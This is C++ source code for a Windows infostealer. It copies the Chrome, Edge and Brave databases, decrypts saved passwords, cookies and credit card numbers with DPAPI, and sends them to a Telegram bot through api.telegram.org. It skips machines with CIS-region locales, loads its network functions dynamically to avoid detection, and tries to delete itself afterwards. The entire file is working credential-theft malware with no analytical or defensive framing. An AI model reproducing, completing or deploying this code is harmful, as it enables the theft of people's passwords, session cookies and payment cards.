#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <vector>
#include <string>
#include <fstream>
#include <sstream>
#include "sqlite3.h"
#include <shlwapi.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")

std::string decrypt(const char* data, int len, char key) {
    std::string out;
    for (int i = 0; i < len; i++) out += data[i] ^ key;
    return out;
}

typedef HINTERNET(WINAPI* InternetOpenA_t)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* InternetConnectA_t)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET(WINAPI* HttpOpenRequestA_t)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* HttpSendRequestA_t)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI* InternetCloseHandle_t)(HINTERNET);

bool isCISRegion() {
    char lang[10];
    GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, lang, sizeof(lang));
    
    const char* cisCountries[] = {
        "RU",
        "BY",
        "KZ",
        "UZ", 
        "KG",
        "TJ",
        "TM",
        "AM", 
        "AZ" 
    };

    for (const char* country : cisCountries) {
        if (strcmp(lang, country) == 0) {
            return true;
        }
    }
    return false;
}

bool initWinINet(InternetOpenA_t& pInternetOpenA, InternetConnectA_t& pInternetConnectA,
                HttpOpenRequestA_t& pHttpOpenRequestA, HttpSendRequestA_t& pHttpSendRequestA,
                InternetCloseHandle_t& pInternetCloseHandle) {
    HMODULE hWinInet = LoadLibraryA("wininet.dll");
    if (!hWinInet) return false;
    pInternetOpenA = (InternetOpenA_t)GetProcAddress(hWinInet, "InternetOpenA");
    pInternetConnectA = (InternetConnectA_t)GetProcAddress(hWinInet, "InternetConnectA");
    pHttpOpenRequestA = (HttpOpenRequestA_t)GetProcAddress(hWinInet, "HttpOpenRequestA");
    pHttpSendRequestA = (HttpSendRequestA_t)GetProcAddress(hWinInet, "HttpSendRequestA");
    pInternetCloseHandle = (InternetCloseHandle_t)GetProcAddress(hWinInet, "InternetCloseHandle");
    return pInternetOpenA && pInternetConnectA && pHttpOpenRequestA && pHttpSendRequestA && pInternetCloseHandle;
}

std::string urlEncode(const std::string& value) {
    std::ostringstream escaped;
    for (char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << '%' << std::uppercase << std::hex << static_cast<int>(c);
        }
    }
    return escaped.str();
}

void sendToTelegram(const std::string& data) {
    printf("Attempting to send data to Telegram...\n");
    printf("Data length: %zu\n", data.length());

    InternetOpenA_t pInternetOpenA = nullptr;
    InternetConnectA_t pInternetConnectA = nullptr;
    HttpOpenRequestA_t pHttpOpenRequestA = nullptr;
    HttpSendRequestA_t pHttpSendRequestA = nullptr;
    InternetCloseHandle_t pInternetCloseHandle = nullptr;

    if (!initWinINet(pInternetOpenA, pInternetConnectA, pHttpOpenRequestA, pHttpSendRequestA, pInternetCloseHandle))
        return;

    std::string botToken = "YOUR_TOKEN";
    std::string chatId = "YOUR_CHAT_ID";

    std::string urlPath = "/bot" + botToken + "/sendMessage";
    std::string body = "chat_id=" + urlEncode(chatId) + "&text=" + urlEncode(data);

    HINTERNET hSession = pInternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return;
    HINTERNET hConnect = pInternetConnectA(hSession, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { pInternetCloseHandle(hSession); return; }
    HINTERNET hRequest = pHttpOpenRequestA(hConnect, "POST", urlPath.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) { pInternetCloseHandle(hConnect); pInternetCloseHandle(hSession); return; }

    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    pHttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)body.c_str(), body.length());

    printf("Send completed.\n");
    pInternetCloseHandle(hRequest);
    pInternetCloseHandle(hConnect);
    pInternetCloseHandle(hSession);
}

std::string stealPasswords() {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::string> browsers = {
        "\\Google\\Chrome\\User Data\\Default",
        "\\Microsoft\\Edge\\User Data\\Default",
        "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
    };

    std::string result = "[PASSWORDS]\n";
    for (const auto& browser : browsers) {
        std::string dbPath = std::string(appDataPath) + browser + "\\Login Data";
        if (!PathFileExistsA(dbPath.c_str())) continue;

        std::string tempPath = std::string(appDataPath) + "\\LoginData.tmp";
        CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE);

        sqlite3* db;
        if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
            DeleteFileA(tempPath.c_str());
            continue;
        }

        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* username = (const char*)sqlite3_column_text(stmt, 1);
                const void* encrypted = sqlite3_column_blob(stmt, 2);
                int size = sqlite3_column_bytes(stmt, 2);

                DATA_BLOB in, out;
                in.pbData = (BYTE*)encrypted;
                in.cbData = size;
                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    result += "URL: " + std::string(url ? url : "") + "\n";
                    result += "Username: " + std::string(username ? username : "") + "\n";
                    result += "Password: " + std::string((char*)out.pbData, out.cbData) + "\n\n";
                    LocalFree(out.pbData);
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
    }
    return result;
}

std::string stealCookies() {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::string> browsers = {
        "\\Google\\Chrome\\User Data\\Default",
        "\\Microsoft\\Edge\\User Data\\Default",
        "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
    };

    std::string result = "[COOKIES]\n";
    for (const auto& browser : browsers) {
        std::string dbPath = std::string(appDataPath) + browser + "\\Cookies";
        if (!PathFileExistsA(dbPath.c_str())) continue;

        std::string tempPath = std::string(appDataPath) + "\\Cookies.tmp";
        CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE);

        sqlite3* db;
        if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
            DeleteFileA(tempPath.c_str());
            continue;
        }

        const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* host = (const char*)sqlite3_column_text(stmt, 0);
                const char* name = (const char*)sqlite3_column_text(stmt, 1);
                const void* encrypted = sqlite3_column_blob(stmt, 2);
                int size = sqlite3_column_bytes(stmt, 2);

                DATA_BLOB in, out;
                in.pbData = (BYTE*)encrypted;
                in.cbData = size;
                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    result += "Host: " + std::string(host ? host : "") + "\n";
                    result += "Name: " + std::string(name ? name : "") + "\n";
                    result += "Value: " + std::string((char*)out.pbData, out.cbData) + "\n\n";
                    LocalFree(out.pbData);
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
    }
    return result;
}


std::string stealCreditCards() {
    printf("=== Starting credit card theft ===\n");
    
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    printf("AppData path: %s\n", appDataPath);
    
    std::vector<std::string> browsers = {
        "\\Google\\Chrome\\User Data\\Default",
        "\\Microsoft\\Edge\\User Data\\Default", 
        "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
    };

    std::string result = "[CREDIT CARDS]\n";
    bool foundAny = false;

    for (const auto& browser : browsers) {
        std::string dbPath = std::string(appDataPath) + browser + "\\Web Data";
        printf("Checking path: %s\n", dbPath.c_str());
        
        if (!PathFileExistsA(dbPath.c_str())) {
            printf("File does not exist: %s\n", dbPath.c_str());
            continue;
        }
        printf("File exists: %s\n", dbPath.c_str());

        std::string tempPath = std::string(appDataPath) + "\\WebData.tmp";
        printf("Copying to temp: %s\n", tempPath.c_str());
        
        if (!CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE)) {
            printf("Copy failed! Error: %lu\n", GetLastError());
            continue;
        }

        sqlite3* db;
        if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
            printf("SQLite open failed: %s\n", sqlite3_errmsg(db));
            DeleteFileA(tempPath.c_str());
            continue;
        }

        const char* query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards";
        sqlite3_stmt* stmt;
        
        printf("Executing query...\n");
        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
            int rowCount = 0;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                rowCount++;
                printf("Found credit card row #%d\n", rowCount);
                
                const char* name = (const char*)sqlite3_column_text(stmt, 0);
                int month = sqlite3_column_int(stmt, 1);
                int year = sqlite3_column_int(stmt, 2);
                const void* encrypted = sqlite3_column_blob(stmt, 3);
                int size = sqlite3_column_bytes(stmt, 3);

                printf("Card name: %s, Month: %d, Year: %d, Data size: %d\n", 
                       name ? name : "NULL", month, year, size);

                DATA_BLOB in, out;
                in.pbData = (BYTE*)encrypted;
                in.cbData = size;
                
                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    std::string cardNumber((char*)out.pbData, out.cbData);
                    printf("SUCCESS - Decrypted card: %s\n", cardNumber.c_str());
                    
                    result += "Name: " + std::string(name ? name : "N/A") + "\n";
                    result += "Number: " + cardNumber + "\n";
                    result += "Exp: " + std::to_string(month) + "/" + std::to_string(year) + "\n\n";
                    foundAny = true;
                    LocalFree(out.pbData);
                } else {
                    printf("Decryption failed! Error: %lu\n", GetLastError());
                }
            }
            printf("Total rows processed: %d\n", rowCount);
            sqlite3_finalize(stmt);
        } else {
            printf("Query preparation failed: %s\n", sqlite3_errmsg(db));
        }
        
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
    }
    
    if (!foundAny) {
        result += "No credit cards found\n";
        printf("=== No credit cards found ===\n");
    } else {
        printf("=== Credit cards found ===\n");
    }
    
    return result;
}

void selfDelete() {
    char ownPath[MAX_PATH];
    GetModuleFileNameA(NULL, ownPath, MAX_PATH);
    DeleteFileA(ownPath);
    ExitProcess(0);
}
int main() {
    if (isCISRegion()) {
        ExitProcess(0);
    }
    std::string stolenData = stealCreditCards();
    if (!stolenData.empty()) {
        sendToTelegram(stolenData);
    }

    std::string passData = stealPasswords();
    if (!passData.empty()) {
        sendToTelegram(passData);
    }

    std::string cookieData = stealCookies();
    if (!cookieData.empty()) {
        sendToTelegram(cookieData);
    }

    selfDelete();
    return 0;
}